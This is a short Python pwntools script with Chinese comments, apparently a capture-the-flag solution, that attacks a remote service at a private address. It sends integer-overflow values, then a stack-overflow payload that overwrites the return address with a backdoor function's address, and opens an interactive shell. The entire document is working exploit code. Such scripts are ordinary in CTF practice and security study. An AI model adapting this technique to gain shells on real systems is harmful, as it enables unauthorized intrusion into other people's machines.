from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11618
p = remote(host, port)

# 第一次输入：触发整数溢出
p.sendlineafter(b"first key :", b'-2147483648')  # 触发整数溢出
p.sendlineafter(b"second key :", b'-1')

# 第二次输入：构造栈溢出 Payload
payload = cyclic(88) + p64(0x4007CB)  # 填充溢出点并覆盖返回地址为后门函数
p.sendlineafter(b"your name :", payload)

# 获取交互式 shell
p.interactive()
